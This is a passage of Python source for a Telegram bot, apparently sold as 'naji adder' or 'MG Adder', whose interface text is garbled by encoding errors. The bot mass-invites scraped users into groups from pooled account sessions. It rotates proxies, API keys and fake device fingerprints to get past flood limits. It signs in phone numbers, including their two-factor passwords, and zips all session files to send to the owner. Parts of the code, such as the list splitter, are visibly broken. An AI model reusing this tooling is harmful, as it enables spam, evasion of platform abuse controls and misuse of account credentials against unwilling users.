                #         await log_msg.edit(text , buttons=[ [Button.inline("âŒ cancel" , "acccancell|{}".format(account)) , Button.inline("âš ï¸ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} â“".format(privacy) , "None") , Button.inline("Other {} â”".format(other) , "None")] , [Button.inline(f"â€¼ï¸ Cancel All {cancelALL} accounts" , "&cancelALL")]])
                #     except :
                #         pass

                # elif ( percent *4 <= scount and scount < percent *5  ):

                #     end= time.time()
                #     text += "â€¢ â– â– â– â– â–¡â–¡â–¡â–¡â–¡â–¡ \n"

                # elif ( percent *5 <= scount and scount < percent *6 ):

                #     end= time.time()
                #     text += "â€¢ â– â– â– â– â– â–¡â–¡â–¡â–¡â–¡ \n"
                #     end = time.time()
                #     timer="â”  `time` : {}".format(str(datetime.timedelta(seconds=(end-start)))[0:7])
                #     text += str(timer)
                #     await asyncio.sleep(1)
                #     try:
                #         await log_msg.edit(text , buttons=[ [Button.inline("âŒ cancel" , "acccancell|{}".format(account)) , Button.inline("âš ï¸ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} â“".format(privacy) , "None") , Button.inline("Other {} â”".format(other) , "None")] , [Button.inline(f"â€¼ï¸ Cancel All {cancelALL} accounts" , "&cancelALL")]])
                #     except :
                #         pass

                # elif ( percent *6 <= scount and scount < percent *7 ):

                #     end= time.time()
                #     text += "â€¢ â– â– â– â– â– â– â–¡â–¡â–¡â–¡ \n"

                elif (percent * 7 <= scount and scount < percent * 8):

                    end = time.time()
                    text += "â€¢ â– â– â– â– â– â– â– â–¡â–¡â–¡ \n"
                    end = time.time()
                    timer = "â”  `time` : {}".format(str(datetime.timedelta(seconds=(end - start)))[0:7])
                    text += str(timer)
                    await asyncio.sleep(1)
                    if scount % 2 == 0:

                        try:
                            await log_msg.edit(text, buttons=[[Button.inline("âŒ Ù„ØºÙˆ", "acccancell|{}".format(account)),
                                                               Button.inline("âš ï¸ Ù„ØºÙˆ Ù‡Ù…Ù‡",
                                                                             ".addcencell|{}".format(account))], [
                                                                  Button.inline(f"â€¼ï¸ Ù„ØºÙˆ Ù‡Ù…Ù‡ {cancelALL} Ø­Ø³Ø§Ø¨ Ù‡Ø§",
                                                                                "&cancelALL")]])
                        except:
                            pass

                # elif ( percent *8 <= scount and scount < percent *9):
                #     end= time.time()
                #     text += "â€¢ â– â– â– â– â– â– â– â– â–¡â–¡ \n"

                # elif ( percent *9 <= scount and scount < percent *10 ):

                #     end= time.time()
                #     text += "â€¢ â– â– â– â– â– â– â– â– â–¡ \n"

                #     end = time.time()
                #     timer="â”  `time` : {}".format(str(datetime.timedelta(seconds=(end-start)))[0:7])
                #     text += str(timer)
                #     await asyncio.sleep(1)
                #     try:
                #         await log_msg.edit(text , buttons=[ [Button.inline("âŒ cancel" , "acccancell|{}".format(account)) , Button.inline("âš ï¸ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} â“".format(privacy) , "None") , Button.inline("Other {} â”".format(other) , "None")] , [Button.inline(f"â€¼ï¸ Cancel All {cancelALL} accounts" , "&cancelALL")]])
                #     except :
                #         pass

                elif (percent * 10 <= scount):
                    end = time.time()
                    text += "â€¢ â– â– â– â– â– â– â– â– â–  \n"

                    end = time.time()
                    timer = "â”  `time` : {}".format(str(datetime.timedelta(seconds=(end - start)))[0:7])
                    text += str(timer)
                    await asyncio.sleep(1)
                    if scount % 2 == 0:

                        try:
                            await log_msg.edit(text, buttons=[[Button.inline("âŒ Ù„ØºÙˆ", "acccancell|{}".format(account)),
                                                               Button.inline("âš ï¸ Ù„ØºÙˆ Ù‡Ù…Ù‡",
                                                                             ".addcencell|{}".format(account))], [
                                                                  Button.inline(f"â€¼ï¸ Ù„ØºÙˆ Ù‡Ù…Ù‡ {cancelALL} Ø­Ø³Ø§Ø¨ Ù‡Ø§",
                                                                                "&cancelALL")]])
                        except:
                            pass

                if (addflag[account] == "0"):
                    print("ssssssssss")
                    end = time.time()

                    await client.disconnect()
                    addflag[account] = "1"
                    break

                usList = []

                for us in range(0, int(num)):
                    # -----------------
                    usList.append(random.choice(usernames2))
                    # -----------------

                try:
                    # ----------

                    # ----------
                    # if (J not in blacklist):
                    # print (usList)
                    await client(functions.channels.InviteToChannelRequest(channel=link, users=usList))
                    # print (r.stringify())

                    if mode == "addID":

                        # userid = [x for x in userid if x not in usList]
                        for i in range(0, int(num)):
                            userid.remove(usList[i])

                    else:
                        # usernames.remove(J)
                        for i in range(0, int(num)):
                            try:
                                usernames.remove(usList[i])
                            except:
                                pass
                    # with open("goldlist.txt" , "a") as myfile:

                    # myfile.write(str(J))

                    # myfile.write("\n")

                    scount += 1

                    tsuccess += 1

                # else:
                #     if mode == "addID":
                #         userid.remove(J)

                #     else :
                #         usernames.remove(J)

                #     print ("[+] Duplicate")

                #     tduplicate+=1

                #     duplicate+=1

                except errors.rpcerrorlist.UserNotMutualContactError:

                    tfaild += 1
                    other += 1
                    fcount += 1
                    print("[-] UserChannelsTooMuchError")
                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    continue


                except errors.rpcerrorlist.UserChannelsTooMuchError:
                    tfaild += 1
                    fcount += 1
                    other += 1
                    print("[-] UserChannelsTooMuchError")
                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass

                        pass
                    continue

                except errors.rpcerrorlist.UserPrivacyRestrictedError:
                    tfaild += 1
                    fcount += 1
                    privacy += 1
                    print("[-] UserPrivacyRestrictedError")
                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass

                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    continue


                except errors.rpcerrorlist.PeerFloodError as perr:

                    fcount += 2
                    tfaild += 1
                    other += 1

                    if mode == "addID":
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else:
                        for i in range(0, int(num)):
                            try:
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    print("[-] PeerFloodError")

                    continue


                except errors.rpcerrorlist.FloodWaitError as e:

                    fcount += 1
                    tfaild += 1
                    wait = [int(s) for s in str(e).split() if s.isdigit()][0]

                    # wait += random.randint(100 ,200)

                    if wait >= 500:
                        await client.disconnect()
                        return [scount, fcount, duplicate]

                    await log_msg.edit("âŒğŸ— {}  ** {} ** ".format(str(e), wait))

                    await asyncio.sleep(wait)




                except ValueError as e:
                    print(str(e))
                    fcount += 1
                    tfaild += 1
                    # break
                    continue

                except errors.ChannelPrivateError:
                    await log_msg.edit("âŒ i banned from this Group")
                    await client.disconnect()
                    break

                except sqlite3.OperationalError:
                    print("SQLITE")
                    await client.disconnect()
                    break


                except errors.rpcerrorlist.AuthKeyDuplicatedError:
                    print("AuthKeyDuplicatedError")
                    await client.disconnect()
                    break

                except errors.rpcerrorlist.AuthKeyUnregisteredError:
                    print("AuthKeyUnregisteredError")
                    await client.disconnect()
                    break
                except Exception as e:
                    # print(4)
                    fcount += 3
                    tfaild += 1
                    other += 1

                    print("error : ", str(e))
                    print(e.__class__)

                    continue






        else:
            text += '''Ø§Ú©Ø§Ù†Øª  {} Ù†Ù…ÛŒ ØªÙˆØ§Ù†Ø¯ Ø¬ÙˆÛŒÙ† Ø´ÙˆØ¯ ! Error code {} ! {}'''.format(account, ww, time.ctime(time.time()))
            await client.disconnect()


    except Exception as e:
        print("[** {} **] ".format(e.__class__), str(e))

    end1 = time.time()
    text = '''â—â•”â•â•**Ø§Ø¯ Ø¨Ù‡ `{}` Ø¨Ø§ ` {}` Ø§Ú©Ø§Ù†Øª **  ** ØªØ¹Ø¯Ø§Ø¯ Ø§Ø¯Ø¯ Ù‡Ø± Ø§Ú©Ø§Ù†Øª :** `{}`\n\n ğŸ† ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯Ø¯  Ø¨Ù‡ Ø§ØªÙ…Ø§Ù… Ø±Ø³ÛŒØ¯  {}

â—â•šâ•â•[âš¡ï¸ naji adder âš¡ï¸]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1 - start1)))[0:7])

    noadd = "1"

    try:
        await log_msg.edit(text, buttons=[[Button.inline("âœ… Ù…ÙˆÙÙ‚", "None"), Button.inline(str(tsuccess), "None")],
                                          [Button.inline("âŒ Ù†Ø§Ù…ÙˆÙÙ‚", "None"), Button.inline(str(tfaild), "None")]])

        await client.disconnect()

        return [scount, fcount, duplicate]

    except Exception as e:

        print("---------> ", e, e.__class__)

        await client.disconnect()

        pass


async def list_splitter(my_list, n):
    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final


# --------
async def worker(msg, link, numacc, delay, mode, usernames):
    ev = []
    global addflag
    accs = []
    tl = 1
    # print ("DELAY"  , delay)
    delay = int(delay)
    ww = None
    text = ''

    # if int(numacc) < 3:
    #    await msg.reply('''âŒ number of accounts  should be `bigger than 2 `

    # add @link **2** 50''')
    #    return

    start = time.time()

    if mode == "addUSERNAME":
        pass



    elif mode == "addID":
        usernames = userid

    if (len(usernames) > 0):
        for item in os.scandir(f'Accounts'):
            if 'journal' not in item.name and '.session' in item.name:
                l = [[Button.inline('{} - {}'.format(tl, item.name)), Button.inline('â™»ï¸')]]
                accs.append(item.name)
                ev.extend(l)
                tl += 1
                ev.extend([[Button.inline('ÙØ¹Ø§Ù„ÛŒØª Ø§Ø®ÛŒØ± '), Button.inline(time.ctime(time.time()))]])


        taskCount = 0
        tasklist = []

        res1 = 0
        res2 = 0

        success = 0
        faild = 0
        duplicate = 0

        if len(accs) == 0:
            await msg.reply("Ø´Ù…Ø§ Ù‡ÛŒÚ† Ø§Ú©Ø§Ù†Øª Ùˆ ÛŒØ§ ØªÙ„ÙÙ†ÛŒ Ù†Ø¯Ø§Ø±ÛŒØ¯ !")
            return


        else:

            await msg.reply('âœ…Ø§Ø¬Ø±Ø§ÛŒ ÙØ±Ø§ÛŒÙ†Ø¯ Ù¾Ø³ Ø§Ø² ØªØ§ÛŒÛŒØ¯ Ù†Ù‡Ø§ÛŒÛŒğŸ‘‡', buttons=[[Button.inline("ØªØ§ÛŒÛŒØ¯ Ù†Ù‡Ø§ÛŒÛŒ", "?1|{}|{}|{}|{}".format(delay, numacc, link, mode))]])



    else:
        await msg.reply("** Ù„ÛŒØ³Øª Ø®Ø§Ù„ÛŒ Ø§Ø³Øª ! \n Ù„Ø·ÙØ§ Ø§Ø¨ØªØ¯Ø§ Ø§Ø² Ø¯Ø³ØªÙˆØ± save all Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯ . ** ")

# @bot.on(events.NewMessage(func= lambda e : e.is_private ))
@bot.on(events.NewMessage())
async def my_event_handler(event):
    # --------------------------
    if event.raw_text.lower() == "/start":
        await event.reply('Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯', buttons=[[Button.text("Ú¯Ø±ÙˆÙ‡ Ø¨Ù‡ Ú¯Ø±ÙˆÙ‡", resize=True), Button.text("Ø±Ø³ÛŒÙˆØ±", resize=True)]])


    if event.sender_id == adminssss:
        if event.raw_text.startswith("/sudo"):
            txt = int(event.raw_text.split("/sudo")[1].strip())
            print(txt)
            NStEVJzsyY.append(txt)
            await event.reply("ğŸ‘½  {} Is Admin Now ! ".format(txt),
                              buttons=[[Button.inline("âŒ remove ", 'admin|{}'.format(txt))]])

            try:
                await bot.send_message(txt, '''ğŸ† Ù…Ø¬ÙˆØ² Ø´Ù…Ø§ ØªÙˆØ³Ø· Ù…Ø§Ù„Ú© ÙØ¹Ø§Ù„ Ø´Ø¯ ! 
â–â–â–â–â–â– 
Ø¨Ù‡ MG Adder Ù†Ø³Ø®Ù‡ 5 ProMax Ø®ÙˆØ´ Ø¢Ù…Ø¯ÛŒØ¯''')

            except Exception as e:
                await event.reply("âš ï¸ {} ".format(str(e)))

        if event.raw_text.startswith("/sudolist"):
            txt = ""
            for users in NStEVJzsyY:
                txt += "ğŸ‘½ " + str(users) + "\n â–â–â–â–â–â– \n"
            await event.reply(txt)

        if event.raw_text.startswith("/delsudo"):
            txt = int(event.raw_text.split("/delsudo")[1].strip())
            NStEVJzsyY.remove(txt)
            await event.reply("âš ï¸ Ú©Ø§Ø±Ø¨Ø± : {}  Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø² Ù„ÛŒØ³Øª Ø§Ø¯Ù…ÛŒÙ† Ø®Ø§Ø±Ø¬ Ø´Ø¯".format(txt))

        if event.raw_text.startswith("/getsessions"):
            try:

                shutil.make_archive("Accounts", 'zip', "Accounts")
                await bot.send_file(int(adminssss), 'Accounts.zip')

            except Exception as e:
                await event.reply(str(e))

    if event.sender_id in NStEVJzsyY:
        
        if event.raw_text.lower() == "Ú¯Ø±ÙˆÙ‡ Ø¨Ù‡ Ú¯Ø±ÙˆÙ‡":
            await event.reply('Ø¨Ù‡ Ø±Ø¨Ø§Øª NajiAdder Ø®ÙˆØ´ Ø§ÙˆÙ…Ø¯ÛŒ', buttons=KEYBOARDHOME)

        

        elif event.raw_text.lower().startswith('get'):

            link = event.raw_text.split('get ')[1]

            await event.reply('''
            ğŸ—Ù„Ø·ÙØ§ Ø±ÙˆØ´ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ ğŸ‘‡


            ''', buttons=[
                [Button.inline('ğŸ†” ÛŒÙˆØ²Ø±Ù†ÛŒÙ…', '@add|addUsername|{}'.format(link)),
                 Button.inline('ğŸ”¼Ø§ÛŒØ¯ÛŒ Ø¹Ø¯Ø¯ÛŒ', '@add|addChatid|{}'.format(link))],
            ])



        elif event.raw_text.lower() == 'aclist':
            ev = []
            tl = 0
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name, 'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1
            if tl >= 1:
                try:
                    await event.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await event.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

            else:
                await event.reply('Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø®Ø§Ù„ÛŒ Ø§Ø³Øª !')



        elif event.raw_text.lower().startswith('save'):
            l = []
            my = event.raw_text.split('save ')[0]
            if my == 'save':
                ev = []
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name, 'save|{}'.format(item.name))]]
                    ev.extend(l)

                if len(l) >= 1:
                    await event.reply('ğŸ”† Ø´Ù…Ø§ Ù…ÛŒ ØªÙˆØ§Ù†ÛŒØ¯ Ù„ÛŒØ³Øª ØªÙ…Ø§Ù… Ú¯Ø±ÙˆÙ‡ Ù‡Ø§ÛŒ Ù…ÙˆØ¬ÙˆØ¯ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø±Ùˆ Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ù†ÛŒØ¯  ',
                                      buttons=ev)
                else:
                    await event.reply('âŒ Ù„ÛŒØ³Øª Ø®Ø§Ù„ÛŒ Ø§Ø³Øª ')
            else:
                w = get_file(my)
                if w != 0:
                    for item in w:
                        usernames.append((item.split('\n')[0]))

                    await event.reply('ğŸ”† ØªØ¹Ø¯Ø§Ø¯  {} ÙØ§ÛŒÙ„ Ù„ÙˆØ¯ Ø´Ø¯ '.format(len(list(set(usernames)))))
                else:
                    await event.reply(' âŒ Ø§Ø³Ù… ÙØ§ÛŒÙ„ Ø§Ø´ØªØ¨Ø§Ù‡ Ù‡Ø³Øª')



        elif event.raw_text.lower() == 'clear':
            if len(usernames) != 0:
                await event.reply('Ø¢ÛŒØ§ Ø§Ø² Ø¯ÛŒÙ„ÛŒØª Ú©Ø±Ø¯Ù† Ø§ÛŒÙ† Ø´Ù…Ø§Ø±Ù‡  {}  Ù…Ø·Ù…ÛŒÙ† Ù‡Ø³ØªÛŒØ¯ ?'.format(len(usernames)), buttons=[
                    [Button.inline('Yes', 'clean'), Button.inline('No', 'no')],
                ])
            else:
                await event.reply('Ù„ÛŒØ³Øª ÛŒÙˆØ²Ø±Ù†ÛŒÙ… Ù‡Ø§ Ø®Ø§Ù„ÛŒ Ø§Ø³Øª !')





        elif event.raw_text.lower() == 'stats':
            await event.reply('ğŸ”† ØªØ¹Ø¯Ø§Ø¯ Ú©Ù„ username Ù‡Ø§  : {}'.format(len(usernames)))


        elif event.raw_text.lower() == 'bot':
            await event.reply('Im Online !')

        elif event.raw_text.lower().startswith('/addphon'):

            try:
                phones = event.raw_text.split('/addphon ')[1].replace(' ', '')
                if os.path.exists('Accounts/{0}.session'.format(phones)):
                    await event.reply('**Ø§ÛŒÙ† Ø§Ú©Ø§Ù†Øª Ø§Ø² Ù‚Ø¨Ù„ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø´ØªÙ‡ ! **')
                else:
                    await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ......**')
                    result, xu = create_api(phones)
                    if result == False:
                        await event.reply(
                            '**Ù…Ø´Ú©Ù„ÛŒ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ú©Ø¯ Ø¨Ù‡ Ø´Ù…Ø§Ø±Ù‡  {} Ù¾ÛŒØ´ Ø§ÙˆÙ…Ø¯Ù‡  ! \n Ø§Ø­ØªÙ…Ø§Ù„Ø§ Ø´Ù…Ø§Ø±Ù‡ Ø´Ù…Ø§ Ù…Ø­Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ \n Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø±Ù‡ Ø¨Ø¹Ø¯ Ø§Ø² 48 Ø³Ø§Ø¹Øª ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ **'.format(
                                phones))
                    else:
                        await event.reply('''
âœ… Ú©Ø¯ Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª Ø¨Ù‡ Ø´Ù…Ø§Ø±Ù‡ : {} Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ â•

âŒÙ„Ø·ÙØ§ Ú©Ø¯ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯Ù‡ Ø±Ùˆ Ø¨Ø§ Ø¯Ø³ØªÙˆØ± Ø²ÛŒØ± ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ :

/web **CODE**
                            '''.format(event.raw_text.split('/addphon ')[1]))
                        data['auth_mode'] = '{0}:{1}:{2}'.format(phones, result, xu)

            except:
                await event.reply("**/addphon** phone")

        elif event.raw_text.lower().startswith('/web'):
            try:

                w = random.choice(apis)

                device = random.choice(devices)
                version1 = random.choice(version)

                key = data['auth_mode']
                await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... **')
                result, xu = auth(key.split(':')[0], key.split(':')[1], event.raw_text.split('/web ')[1],
                                  key.split(":")[2])
                if result == False:
                    await event.reply('**Ù…Ø´Ú©ÛŒ Ø¯Ø± Ø³Ø§Ø®Øª api Ù¾ÛŒØ´ Ø§ÙˆÙ…Ø¯Ù‡ Ù„Ø·ÙØ§ Ø¨Ø¹Ø¯Ø§ Ù…Ø¬Ø¯Ø¯Ø§ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ ! **')
                    data.clear()
                else:

                    await event.reply('**âœ… Ø§Ú©Ø§Ù†Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø«Ø¨Øª Ø´Ø¯ \n Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ......**')
                    # await change('69YYF5')
                    api_info, xu = auth2(result, key.split(":")[2])
                    await event.reply(
                        '** Api `[{0}]` Ø¨**Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø³Ø§Ø®ØªÙ‡ Ø´Ø¯ ** !\nÙ„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ... \n ÛŒØ§ Ú©Ø¯ Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯ ...**'.format(
                            api_info))
                    # ---------

                    # ---------
                    with open('apilist.txt', 'a') as file:
                        file.write('{0}:{1}:{2}'.format(api_info.split(':')[0], api_info.split(':')[1], key.split(':')[0]))
                        file.write("\n")

                        file.close()
                    data.clear()
                    pr = await random_proxy()
                    # pr = random_proxy()
                    # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                    new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), w[0], w[1],
                                         connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                         proxy=pr,
                                         device_model=device,
                                         system_version=version1,
                                         app_version="7.84",
                                         lang_code='en',
                                         system_lang_code='en')

                    await new.connect()
                    if not await new.is_user_authorized():
                        try:
                            result = await new.send_code_request(key.split(':')[0])
                            data['code_mode'] = '{0}:{1}:{2}:{3}'.format(key.split(':')[0], result.phone_code_hash,
                                                                         api_info.split(':')[0], api_info.split(':')[1])
                            await new.disconnect()
                            await event.reply('''
** âœ… Ú©Ø¯ ÙˆØ±ÙˆØ¯ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ Ù„Ø·ÙØ§ Ú©Ø¯ Ø±Ùˆ Ø¨Ù‡ ÙØ±Ù…Øª Ø²ÛŒØ± ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ :

/cod CODE**
                                ''')
                        except Exception:
                            await event.reply('**Ù…Ø´Ú©Ù„ÛŒ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ú©Ø¯ Ù¾ÛŒØ´ Ø§ÙˆÙ…Ø¯Ù‡ Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø³Ø¹ÛŒ Ú©Ù†ÛŒØ¯ ....**')
            except KeyError:
                await event.reply('**Ø§Ú©Ø§Ù†ØªÛŒ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ ÙˆØ¬ÙˆØ¯  Ù†Ø¯Ø§Ø±Ø¯ ! Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø´Ù…Ø§Ø±Ù‡ Ø±Ùˆ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ **')

        elif event.raw_text.lower().startswith('/test'):
            print(await random_proxy())

        elif event.raw_text.lower().startswith('/cod'):

            try:

                # w = random.choice(apis)
                device = random.choice(devices)
                version1 = random.choice(version)

                key = data['code_mode']
                await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... **')
                print(key.split(':')[2], key.split(':')[3])
                pr = await random_proxy()
                # pr = random_proxy()
                # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), key.split(':')[2], key.split(':')[3],
                                     connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                     proxy=pr,
                                     device_model=device,
                                     system_version=version1,
                                     app_version="7.84",
                                     lang_code='en',
                                     system_lang_code='en')

                await new.connect()

                await new(
                    functions.auth.SignInRequest(phone_number=key.split(':')[0], phone_code_hash=key.split(':')[1],
                                                 phone_code=event.raw_text.split('/cod ')[1]))
                await event.reply('**Ø§Ú©Ø§Ù†Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ù„Ø§Ú¯ Ø´Ø¯**')

                data.clear()
            except errors.SessionPasswordNeededError:
                await event.reply(
                    '**Ø§Ú©Ø§Ù†Øª Ø±Ù…Ø² Ø¯Ùˆ Ù…Ø±Ø­Ù„Ù‡ Ø§ÛŒ Ø¯Ø§Ø±Ø¯ Ù„Ø·ÙØ§ Ø¨Ø§ Ø¯Ø³ØªÙˆØ± Ø²ÛŒØ±  Ø¢Ù† Ø±Ø§ ÙØ¹Ø§Ù„ Ú©Ù†ÛŒØ¯ \n  /pass PASSWORD**')
                data.clear()
                data['step_mode'] = key
            except KeyError:
                await event.reply('**Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ Ùˆ Ø´Ù…Ø§Ø±Ù‡ Ø±Ùˆ Ù…Ø¬Ø¯Ø¯Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ **')
            await new.disconnect()



        elif event.raw_text.lower().startswith('/pass'):
            try:

                device = random.choice(devices)
                version1 = random.choice(version)

                key = data['step_mode']
                m = await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... **')
                # k2 = get_api(key.split(':')[0])

                # print ("------- > " , k2)
                #### -- anti flood
                k2 = random.choice(apis)
                pr = await random_proxy()
                # pr = random_proxy()
                # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), int(k2[0]), k2[1],
                                     connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                     proxy=pr,
                                     device_model=device,
                                     system_version=version1,
                                     app_version="7.84",
                                     lang_code='en',
                                     system_lang_code='en')

                await new.connect()

                await new.sign_in(password=event.raw_text.split('/pass ')[1])
                data.clear()
                info = await new.get_me()

                result = None

                await new.disconnect()
                await event.reply(
                    '** \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n ğŸ— Api [{0}] Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø§Ø¶Ø§ÙÙ‡ Ø´Ø¯  !\n \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n Ù…Ø´Ø®ØµØ§Øª Ø§Ú©Ø§Ù†Øª \n ğŸ— Ù†Ø§Ù… Ú©Ø§Ø±Ø¨Ø±ÛŒ Ø­Ø³Ø§Ø¨ : {1}\n \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n ğŸ— ØªÙ„ÙÙ† Ø§Ú©Ø§Ù†Øª : +{2}\n  \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n ğŸ— Ù†Ø§Ù… Ø­Ø³Ø§Ø¨ : {3}\n \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹\n ğŸ— Ù†Ø§Ù… Ø®Ø§Ù†ÙˆØ§Ø¯Ú¯ÛŒ Ø­Ø³Ø§Ø¨ : {4}** \nğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n'.format(
                        key.split(':')[2] + ':' + key.split(':')[3], str(info.username), str(info.phone),
                        info.first_name, info.last_name))
                # await change('69YYF5')
            except KeyError:
                await event.reply('**Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ Ùˆ Ø´Ù…Ø§Ø±Ù‡ Ø±Ùˆ Ù…Ø¬Ø¯Ø¯Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ **')
            except errors.PasswordHashInvalidError:
                await event.reply(
                    '**âŒ Ù¾Ø³ÙˆØ±Ø¯ Ø§Ø´ØªØ¨Ø§Ù‡ Ù‡Ø³Øª Ù„Ø·ÙØ§ Ù…Ø¬Ø¯Ø¯Ø§ Ù¾Ø³ÙˆØ±Ø¯ Ø¯Ø±Ø³Øª Ø±Ùˆ Ø¨Ù‡ ÙØ±Ù…Øª Ø²ÛŒØ± ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ \n  /pass PASSWORD**')
            await new.disconnect()



        elif event.raw_text.lower() == "spambot":

            await SendToSpamBot(event)



        elif event.raw_text.lower().startswith("add"):

            x = event.raw_text

            datas = (x.split(' ', 1)[1]).split(' ')

            try:

                link = datas[0]
                num = datas[1]
                total = datas[2]

                # dirNum = datas[3]

                await event.reply("ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯ Ø¨Ø±Ø§Ø³Ø§Ø³ ÛŒÙˆØ²Ø±Ù‡Ø§ÛŒ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø´Ø¯Ù‡ Ø§Ù†ØªØ®Ø§Ø¨ Ø´ÙˆØ¯ğŸ‘‡", buttons=[
                    [Button.inline('Ø§ÛŒØ¯ÛŒ Ø¹Ø¯Ø¯ÛŒ', 'addID|{}|{}|{}'.format(link, num, total)),
                     Button.inline('ÛŒÙˆØ²Ø±Ù†ÛŒÙ…', 'addUSERNAME|{}|{}|{}'.format(link, num, total))]])

            except:

